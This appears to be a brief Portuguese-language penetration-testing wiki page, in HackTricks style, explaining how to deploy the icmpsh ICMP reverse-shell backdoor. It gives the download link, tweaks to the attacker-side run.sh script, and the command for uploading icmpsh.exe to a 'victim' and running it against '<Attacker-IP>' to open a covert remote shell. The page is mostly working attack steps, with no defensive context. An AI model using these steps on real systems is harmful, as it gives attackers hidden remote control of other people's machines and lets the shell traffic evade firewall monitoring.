{{#include ../banners/hacktricks-training.md}}

Baixe o backdoor de: [https://github.com/inquisb/icmpsh](https://github.com/inquisb/icmpsh)

# Lado do cliente

Execute o script: **run.sh**

**Se você receber algum erro, tente mudar as linhas:**
```bash
IPINT=$(ifconfig | grep "eth" | cut -d " " -f 1 | head -1)
IP=$(ifconfig "$IPINT" |grep "inet addr:" |cut -d ":" -f 2 |awk '{ print $1 }')
```
**Para:**
```bash
echo Please insert the IP where you want to listen
read IP
```
# **Lado da Vítima**

Faça o upload de **icmpsh.exe** para a vítima e execute:
```bash
icmpsh.exe -t <Attacker-IP> -d 500 -b 30 -s 128
```
{{#include ../banners/hacktricks-training.md}}
